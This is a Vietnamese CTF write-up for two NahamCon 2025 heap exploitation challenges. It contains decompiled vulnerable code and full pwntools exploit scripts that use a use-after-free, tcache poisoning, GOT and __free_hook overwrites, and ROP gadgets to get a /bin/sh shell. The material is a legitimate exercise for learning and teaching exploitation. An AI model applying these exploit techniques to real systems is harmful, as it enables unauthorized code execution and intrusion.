@@ -1,0 +1,372 @@
+---
+title: '[WRITE UP] - NahamCon CTF 2025'
+description: 'Yet another CTF wrtite up'
+image: '../../img/cover_photo_wup_imresizer.png'
+date: 2025-05-25
+tags: ['2025', 'PWN', 'WriteUp']
+authors: ['kdot']
+draft: false
+---
+
+import Challenge from '@/components/mdx/Challenge.astro'
+
+Sau một thời gian dài tryhard heap thì đây là giải đầu tiên mình bắt đầu chơi CTF lại. Giải này có 2 bài heap khá hay và đây sẽ là write up cho 2 bài đó.
+
+## Lost Memory
+
+<Challenge
+  authors={["WittsEnd2"]}
+  category="pwn"
+  points={306}
+  solves={190}
+  description="I am trying to remember something, but I keep forgetting."
+  flag="flag{2658c992bda627329ed2a8e6225623c6}"
+>
+</Challenge>
+
+Mình sẽ tập trung phân tích những điểm chính trong binary này, đầu tiên là `checksec`:
+
+```sh title="checksec"
+$ checksec lost_memory
+[*] '/mnt/e/sec/CTFs/2025/Nahamcon/Lost_Memory/lost_memory'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+Như ta có thể thấy, RELRO là Partial RELRO, và PIE tắt nên chúng ta có thể nghĩ đến ban đầu là việc overwrite GOT entry. Tiến sâu hơn vào phân tích binary:
+
+```c
+int vuln()
+{
+  __int64 memIndex; // rbx
+  _QWORD v2[3]; // [rsp+8h] [rbp-18h] BYREF
+
+  v2[0] = 0xDEADBEEFDEADBEEFLL;
+  setup_globals();
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            choice = 0;
+            menu();
+            fflush(stdin);
+            fgets(&input, 256, stdin);
+            choice = atoi(&input);
+            memset(&input, 0, 0x100uLL);
+            size = 0LL;
+            if ( choice != 1 )
+              break;
+            puts("What size would you like?");
+            fgets(&input, 256, stdin);
+            size = atol(&input);
+            memset(&input, 0, 0x100uLL);
+            if ( size > 0x100 )
+              return puts("Size too large");
+            memIndex = ::memIndex;
+            *(&ptr + memIndex) = malloc(size);
+            ptrSize[::memIndex] = size;
+            puts("Allocated memory");
+          }
+          if ( choice != 2 )
+            break;
+          puts("What would you like to write?");
+          fflush(stdin);
+          fgets(&input, 256, stdin);
+          if ( !input )
+            return puts("No input provided");
+          puts("Writing to memory...");
+          memcpy(*(&ptr + ::memIndex), &input, ptrSize[::memIndex]);
+          printf("ptr[memIndex] = %s\n", (const char *)*(&ptr + ::memIndex));
+          printf("input = %s\n", &input);
+          memset(&input, 0, 0x100uLL);
+        }
+        if ( choice != 3 )
+          break;
+        printf("Select an index to write to (0 - %d)\n ", 9);
+        fgets(&input, 256, stdin);
+        ::memIndex = atol(&input);
+        memset(&input, 0, 0x100uLL);
+        if ( (unsigned __int64)::memIndex > 9 )
+          return puts("Invalid index");
+      }
+      if ( choice != 4 )
+        break;
+      if ( *(&ptr + ::memIndex) )
+      {
+        puts("Freeing memory...");
+        free(*(&ptr + ::memIndex));
+      }
+      else
+      {
+        puts("No memory to free");
+      }
+    }
+    if ( choice != 5 )
+      break;
+    puts("Storing flag return value");
+    *(_QWORD *)*(&ptr + ::memIndex) = v2;
+    printf("Stored return value: %p\n", *(const void **)*(&ptr + ::memIndex));
+    printf("Stored return value: %p\n", v2);
+  }
+  if ( choice == 6 )
+    return puts("Exiting...");
+  else
+    return puts("Invalid choice");
+}
+```
+
+Tất cả mọi thứ đều gói gọn trong hàm `vuln()`, nhìn vào đó ta sẽ thấy có bug `Use-After-Free` ở option 4. Và để ý kĩ hơn ta sẽ thấy option 5 sẽ leak cho ta địa chỉ stack. Như vậy những gì chúng ta có là một cái địa chỉ stack, và bug UAF. Khi check các gadgets, mình thấy có các gadget khá hữu ích như sau:
+
+```sh
+0x401759: pop rbx ; pop rbp ; ret ;
+0x40125c: add  [rbp-0x3D], ebx ; nop ; ret ;
+```
+
+Hai gadget này sẽ giúp ta cộng pointer của một địa chỉ bất kì, ở đây mình chọn địa chỉ GOT của `atoi` vì sau đó ta sẽ cho nó ret2main và nhập chuỗi `/bin/sh` vào là có được shell
+
+```py title="exploit.py"
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwnie import *
+from subprocess import check_output
+from time import sleep
+
+context.log_level = 'debug'
+context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
+exe = context.binary = ELF('./lost_memory_patched', checksec=False)
+libc = exe.libc
+
+gdbscript = '''
+init-pwndbg
+# init-gef-bata
+b *0x4014E7
+b *0x4016B0
+b *0x4015A5
+b *0x40175B
+c
+'''
+
+def start(argv=[]):
+    if args.GDB:
+        p = process([exe.path] + argv, aslr=False)
+        gdb.attach(p, gdbscript=gdbscript)
+        pause()
+        return p
+    elif args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2])
+    elif args.DOCKER:
+        p = remote("localhost", 5000)
+        sleep(0.5)
+        pid = int(check_output(["pidof", "-s", "/app/run"]))
+        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
+        pause()
+        return p
+    else:
+        return process([exe.path] + argv)
+
+def choice(option: int):
+    slna(b'choice:\n', option)
+
+def alloc(size):
+    choice(1)
+    slna(b'like?\n', size)
+
+def write(data):
+    choice(2)
+    sla(b'write?\n', data)
+
+def free():
+    choice(4)
+
+def show():
+    choice(5)
+    ru(b'return value: ')
+    return rl()[:-1]
+
+# ==================== EXPLOIT ====================
+p = start()
+
+alloc(0x100) # 0
+stack_leak = int(show(), 16)
+success('stack leak @ %#x', stack_leak)
+
+free()
+write(b'0'*8)
+free()
+
+write(p64(stack_leak + 0x18)) # saved rbp
+alloc(0x100)
+alloc(0x100)
+
+pop_rbx_rbp = 0x401759
+add_ptr     = 0x40125c
+ret         = 0x40101a
+
+write(flat(
+    0xdeadbeef,
+    pop_rbx_rbp,
+    0xdce0, exe.got.atoi + 0x3d,
+    add_ptr,
+    ret,
+    exe.sym.main
+))
+
+choice(6)
+sl(b'/bin/sh\0')
+
+interactive()
+```
+
+---
+
+## Found memory
+
+<Challenge
+  authors={["WittsEnd2", "z3phyr"]}
+  category="pwn"
+  points={306}
+  solves={190}
+  description="I have found something! But not getting anywhere."
+  flag="flag{04b12c28513188fbf6513f8d080b9ee1}"
+>
+</Challenge>
+
+Bài này thì khó hơn một chút, do ta chỉ được tạo mỗi lần một chunk 0x30 thôi, nhưng nó vẫn tồn tại lỗi UAF, mình có thể tận dụng nó, và control fd của free chunk trong tcache. Mình sẽ muốn leak được địa chỉ của libc nên việc đầu tiên của mình sẽ phải là làm ra một chunk 0x420. Sau đó là overwrite `__free_hook`. Cách của mình cần brute vì nó không có leak heap, nhưng chúng ta có thể leak được heap vì bài này cho chúng ta alloc tận 100 lần nên điều đó thoải mái
+
+```py title="exploit.py"
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwnie import *
+from subprocess import check_output
+from time import sleep
+
+# context.log_level = 'debug'
+context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
+exe = context.binary = ELF('./found_memory_patched', checksec=False)
+libc = exe.libc
+
+gdbscript = '''
+init-pwndbg
+# init-gef-bata
+brva 0x16EB
+brva 0x15BC
+brva 0x1495
+brva 0x1647
+c
+'''
+
+def start(argv=[]):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2])
+    elif args.DOCKER:
+        p = remote("localhost", 5000)
+        sleep(0.5)
+        pid = int(check_output(["pidof", "-s", "/app/run"]))
+        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
+        pause()
+        return p
+    else:
+        return process([exe.path] + argv)
+
+def choice(option: int):
+    slna(b'> ', option)
+
+def alloc():
+    choice(1)
+    ru(b'Allocated slot ')
+    info(f'Allocated slot @ {rl()[:-1]}')
+
+def free(idx):
+    choice(2)
+    slna(b': ', idx)
+
+def view(idx):
+    choice(3)
+    slna(b': ', idx)
+
+def edit(idx, data):
+    choice(4)
+    slna(b': ', idx)
+    sa(b'Enter data: ', data)
+
+# ==================== EXPLOIT ====================
+
+while True:
+    p = start()
+    try:
+        # Leak libc address
+        alloc() # 0
+        alloc() # 1
+        alloc() # 2
+
+        free(1)
+        free(2)
+
+        edit(2, p8(0x90))   # Overwrite chunk at index 2 point to metadata of chunk 0
+        alloc()
+        alloc() # 2
+
+        edit(2, p64(0) + p64(0x421)) # Overwrite chunk 0 metadata to make it 0x420 bytes
+        alloc() # 3
+
+        free(1)
+        free(3)
+
+        edit(3, p16(0xa6b0))
+
+        alloc() # 1
+        alloc() # 3
+
+        fake_chunk = flat(
+            0, 0x21,
+            0, 0,
+            0, 0x21
+        )
+
+        edit(3, fake_chunk) # Bypass unsortedbin mitigation
+        free(0) # [Need to brute] Free it and this chunk goes to unsortedbin
+
+        view(0)
+        libc.address = u64(rb(6).ljust(0x8, b'\0')) - 0x1ecbe0
+        success('libc base @ %#x', libc.address)
+
+        if args.GDB:
+            gdb.attach(p, gdbscript=gdbscript)
+            pause()
+
+        # Overwrite __free_hook with system
+        alloc() # 0
+        alloc() # 4
+
+        free(0)
+        free(4)
+
+        edit(4, p64(libc.sym.__free_hook))
+
+        alloc() # 0
+        alloc() # 4
+
+        edit(4, p64(libc.sym.system))
+        edit(0, b'/bin/sh\0')
+        free(0)
+
+        sl(b'echo WIN')
+        if b'WIN' in rl():
+            success('Got shell!')
+            interactive()
+            break
+    except:
+        close()
+```
